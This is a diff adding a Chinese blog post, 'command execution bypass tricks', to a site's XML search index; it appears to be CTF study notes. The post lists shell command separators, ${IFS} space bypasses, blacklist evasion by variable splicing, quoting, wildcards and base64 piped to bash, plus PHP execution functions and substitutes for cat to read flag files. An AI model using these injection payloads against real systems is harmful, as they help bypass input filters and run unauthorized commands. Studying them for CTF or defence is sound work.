@@ -17,6 +17,19 @@
   
   
   <entry>
+    <title>命令执行绕过小技巧</title>
+    <link href="/2023/04/19/minlinzhixinraoguo/"/>
+    <url>/2023/04/19/minlinzhixinraoguo/</url>
+    
+    <content type="html"><![CDATA[<h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><h4 id="windows-下："><a href="#windows-下：" class="headerlink" title="windows 下："></a>windows 下：</h4><blockquote><ul><li><strong>|</strong> 直接执行后面的语句</li><li><strong>||</strong> 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</li><li><strong>&amp;</strong> 前面和后面命令都要执行，无论前面真假</li><li><strong>&amp;&amp;</strong> 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</li></ul></blockquote><h4 id="Linux-下："><a href="#Linux-下：" class="headerlink" title="Linux 下："></a>Linux 下：</h4><blockquote><ul><li><strong>;</strong> 前面和后面命令都要执行，无论前面真假</li><li><strong>|</strong> 直接执行后面的语句</li><li><strong>||</strong> 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</li><li><strong>&amp;</strong> 前面和后面命令都要执行，无论前面真假</li><li><strong>&amp;&amp;</strong> 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</li></ul></blockquote><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><ul><li><strong>&gt;</strong> &lt; &lt;&gt; 重定向符</li><li>%09(需要php环境)</li><li>${IFS}</li><li>$IFS$9</li><li>{cat,flag.php} &#x2F;&#x2F;用逗号实现了空格功能</li><li>%20</li><li>%09</li></ul><h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><blockquote><ul><li>system()</li><li>passthru()</li><li>exec()</li><li>shell_exec()</li><li>popen()</li><li>proc_open()</li><li>pcntl_exec()</li><li>反引号 同shell_exec()</li></ul></blockquote><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h4 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h4><blockquote><p>a&#x3D;c;b&#x3D;at;c&#x3D;fl;d&#x3D;ag;$a$b $c$d</p></blockquote><h4 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h4><blockquote><p>echo “Y2F0IGZsYWc&#x3D;”|base64 -d<br>echo “Y2F0IGZsYWc&#x3D;”|base64 -d|bash (在bash被过滤的情况下可尝试sh)</p></blockquote><h4 id="单引号、双引号"><a href="#单引号、双引号" class="headerlink" title="单引号、双引号"></a>单引号、双引号</h4><blockquote><p>c””at fl’’ag</p></blockquote><h4 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h4><blockquote><p>c\at fl\ag</p></blockquote><h4 id="正则-假设-x2F-bin-x2F-cat-test-是一个目录"><a href="#正则-假设-x2F-bin-x2F-cat-test-是一个目录" class="headerlink" title="正则 (假设&#x2F;bin&#x2F;cat: test: 是一个目录)"></a>正则 (假设&#x2F;bin&#x2F;cat: test: 是一个目录)</h4><blockquote><p>&#x2F;???&#x2F;?[a][t] ?’’?’’?’’?’’<br>&#x2F;???&#x2F;?at ????<br>&#x2F;???&#x2F;?[a]’’[t] ?’’?’’?’’?’’</p></blockquote><h4 id="1、-2等和"><a href="#1、-2等和" class="headerlink" title="$1、$2等和$@"></a>$1、$2等和$@</h4><blockquote><ul><li>$# 是传给脚本的参数个数</li><li>$0 是脚本本身的名字</li><li>$1 是传递给该shell脚本的第一个参数</li><li>$2 是传递给该shell脚本的第二个参数</li><li>$@ 是传给脚本的所有参数的列表</li><li>$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</li><li>$$ 是脚本运行的当前进程ID号</li><li>$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</li></ul></blockquote><h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><blockquote><p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容</p></blockquote><h2 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h2><blockquote><p>cat$IFS$9<code>ls</code><br>cat$IFS$9$(ls)</p></blockquote><p>(内联，就是将&#96;&#96;或$()内命令的输出作为输入执行)</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>每周报告</title>
     <link href="/2023/04/15/my-blogneirong/"/>
     <url>/2023/04/15/my-blogneirong/</url>
